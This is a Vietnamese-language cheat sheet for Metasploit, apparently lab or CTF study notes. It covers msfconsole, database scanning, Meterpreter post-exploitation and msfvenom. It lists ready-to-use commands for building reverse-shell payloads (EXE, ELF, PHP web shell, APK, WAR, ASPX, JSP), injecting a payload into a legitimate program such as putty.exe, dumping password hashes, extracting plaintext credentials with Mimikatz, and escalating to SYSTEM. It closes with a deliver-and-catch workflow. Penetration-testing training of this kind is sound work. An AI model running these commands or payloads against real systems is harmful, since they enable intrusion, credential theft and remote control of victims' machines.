# I) Msfconsole Commands 

**Tìm & xem**
- `search` → tìm module (kèm filter: `type`, `platform`, `cve`, `name`)
- `info` → chi tiết module

**Chọn & cấu hình**
- `use <module>` → nạp module
- `show options` → xem tham số
- `show payloads` → xem payload tương thích
- `set` → gán tham số (cục bộ)
- `setg` → gán tham số (toàn cục)
- `set PAYLOAD` → chọn payload
- `unset` / `unset all` → xóa / reset

**Chạy**
- `check` → kiểm tra an toàn
- `exploit` / `run` → chạy module
- `exploit -z` → chạy & background
- `back` → thoát module

**Quản lý session**
- `sessions` → liệt kê
- `sessions -i <id>` → tương tác
- `background` / `Ctrl+Z` → background
- `sessions -k <id>` → kill 1
- `sessions -K` → kill all

# II) Metasploit Scanning & Database

#### Database & Workspace
- `sudo msfdb init` → khởi tạo database
- `db_status` → kiểm tra kết nối DB
- `workspace` → xem workspace hiện tại
- `workspace -a <tên>` → tạo workspace mới
- `workspace <tên>` → chuyển workspace
- `workspace -d <tên>` → xóa workspace

#### Scan & lưu vào DB
- `db_nmap -sV -O <IP>` → quét Nmap, lưu kết quả vào DB
- `db_import <file.xml>` → nhập kết quả scan ngoài
- `db_export` → xuất dữ liệu DB

#### Xem dữ liệu
- `hosts` → liệt kê host
- `services` → liệt kê dịch vụ/cổng
- `services -S <tên>` → lọc theo tên dịch vụ
- `creds` → xem credential thu thập
- `vulns` → xem lỗ hổng đã ghi nhận

#### Tự điền RHOSTS từ DB
- `hosts -R` → gán tất cả host vào RHOSTS
- `services -S <tên> -R` → gán host có dịch vụ cụ thể vào RHOSTS

#### Module Scanner thường dùng
| Mục đích               | Module                                |
| ---------------------- | ------------------------------------- |
| Quét cổng TCP          | `auxiliary/scanner/portscan/tcp`      |
| Check MS17-010         | `auxiliary/scanner/smb/smb_ms17_010`  |
| Brute SMB login        | `auxiliary/scanner/smb/smb_login`     |
| Check anonymous FTP    | `auxiliary/scanner/ftp/ftp_anonymous` |
| Lấy tên máy (NetBIOS)  | `auxiliary/scanner/netbios/nbname`    |
| Lấy version web server | `auxiliary/scanner/http/http_version` |

> 💡 **Quy trình:** `db_nmap` → xem `services` → `search type:auxiliary <tên>` → `use` → `set RHOSTS` (hoặc `services -R`) → `run` → `vulns` xem kết quả.


# III)Cheatsheet: Meterpreter & Post-Exploitation

#### Kiến trúc Meterpreter
- **In-Memory**: Chạy trong RAM, không ghi file ra đĩa.
- **Encrypted Communication**: Traffic mã hóa (TLS/AES).
- **Extensible**: Dùng `load` để nạp thêm extension.

#### Chọn Meterpreter
- **OS**: `windows`, `linux`, `java`, `php`, `python`.
- **Connection**: `reverse_tcp`, `reverse_https`, `bind_tcp`.
- **Staged vs Stageless**: `/` = staged, `_` = stageless.

---

#### Lệnh tình huống (Awareness)
- `sysinfo` – thông tin hệ thống
- `getuid` – user hiện tại
- `getpid` – PID hiện tại
- `ps` – liệt kê process
- `idletime` – thời gian người dùng rời máy

#### Lệnh file system
- `pwd`, `cd`, `ls` – điều hướng
- `cat` – đọc file
- `search -f <pattern> -d <dir>` – tìm file
- `download <remote> <local>` – tải file về
- `upload <local> <remote>` – đưa file lên

#### Lệnh mạng
- `ifconfig` – xem IP/interface
- `netstat` – xem kết nối

#### Lệnh OS
- `shell` – mở cmd/sh
- `execute -f <cmd> -i` – chạy lệnh

---

#### Post-Exploitation
- `migrate <PID>` – chuyển process
- `getsystem` – leo lên SYSTEM
- `hashdump` – lấy hash SAM
- `load kiwi` – nạp Mimikatz
- `creds_all` – lấy mọi credential
- `background` – background session
- `use post/...` + `set SESSION <id>` + `run` – chạy post module

---

#### Quy trình post module
1. `background`
2. `use post/<module>`
3. `set SESSION <id>`
4. `run`

---

#### Ghi nhớ nhanh
- Sau khi exploit, luôn chạy `sysinfo`, `getuid`, `getpid`.
- Muốn leo quyền: `getsystem` → nếu fail, `migrate` sang process SYSTEM rồi thử lại.
- Muốn lấy hash: `hashdump` (cần SYSTEM).
- Muốn lấy mật khẩu plaintext: `load kiwi` + `creds_all`.
- Luôn `help` để xem danh sách lệnh có sẵn.

# IV) Cheatsheet: Metasploit Payload Generation (msfvenom)

#### Cú pháp cơ bản
```
msfvenom -p <payload> LHOST=<IP> LPORT=<port> -f <format> -o <file>
```

#### Các flag quan trọng
- `-p` (payload) – chọn payload
- `-f` (format) – định dạng output (`exe`, `elf`, `raw`, `c`, `python`, `powershell`, `hex`, `base64`...)
- `-o` (output) – ghi ra file
- `-e` (encoder) – chọn encoder (`x86/shikata_ga_nai`)
- `-i` (iterations) – số lần lặp encode
- `-b` (bad chars) – tránh ký tự xấu (`'\x00\x0a\x0d'`)
- `-x` (template) – file mẫu để chèn payload
- `-k` (keep) – giữ nguyên chức năng file mẫu
- `-a` (architecture) – kiến trúc (`x64`, `x86`)
- `--platform` – nền tảng (`windows`, `linux`, `android`)
- `-n` (nopsled) – thêm NOP sled N bytes
- `-l` (list) – liệt kê payloads/formats/encoders/platforms/archs
- `--list-options` – xem options của payload

#### Staged vs Stageless
- **Staged** (dấu `/`): `windows/x64/meterpreter/reverse_tcp` – file nhỏ, cần handler serve stage
- **Stageless** (dấu `_`): `windows/x64/meterpreter_reverse_tcp` – tự chứa, đáng tin, dùng cho file standalone

#### Executable vs Transform formats
- **Executable**: `exe`, `elf`, `macho`, `msi`, `apk`, `war`, `dll` – tạo file chạy trực tiếp
- **Transform**: `raw`, `c`, `csharp`, `python`, `powershell`, `hex`, `base64` – dữ liệu để nhúng vào script/loader

#### Công thức payload phổ biến
| Mục tiêu | Lệnh |
|----------|------|
| Windows EXE | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<port> -f exe -o shell.exe` |
| Linux ELF | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<port> -f elf -o shell.elf` |
| PHP web shell | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<port> -f raw -o shell.php` |
| Python one-liner | `msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<port> -f raw` |
| Raw shellcode C | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<port> -f c` |
| Android APK | `msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -o evil.apk` |
| Java WAR | `msfvenom -p java/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f war -o shell.war` |
| ASPX (IIS) | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<port> -f aspx -o shell.aspx` |
| JSP | `msfvenom -p java/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f jsp -o shell.jsp` |

#### Encoding (không phải trốn AV)
- Mục đích chính: **loại bỏ bad chars**, đáp ứng giới hạn ký tự.
- `-e x86/shikata_ga_nai -i 3`
- `-b '\x00\x0a\x0d'` – msfvenom tự chọn encoder nếu cần.
- ⚠️ Không bypass được AV hiện đại (EDR, AMSI, sandboxing).

#### Template Injection (chèn payload vào file có sẵn)
- `-x /path/to/putty.exe` – dùng file mẫu
- `-k` – giữ nguyên chức năng file gốc
- Nhược điểm: hash thay đổi, mất chữ ký số, dễ bị AV phát hiện.

#### Multi/Handler (bắt reverse connection)
```
use exploit/multi/handler
set PAYLOAD <same_as_msfvenom>
set LHOST <IP>
set LPORT <port>
run -j
```
- `ExitOnSession false` – bắt nhiều session
- `AutoRunScript post/windows/manage/migrate` – tự migrate khi session mở

#### Workflow Generate → Deliver → Catch → Post-Exploit
1. Tạo payload bằng `msfvenom`
2. Mở handler `exploit/multi/handler` (khớp chính xác)
3. Upload payload (SMB, SSH, web upload...)
4. Thực thi payload trên mục tiêu
5. Nhận session → `sysinfo`, `getuid`, `hashdump`, `search -f flag*`...

> 💡 Quy tắc vàng: PAYLOAD, LHOST, LPORT trong msfvenom và handler phải giống hệt.

Chúc mày thao tác ngon lành! 😎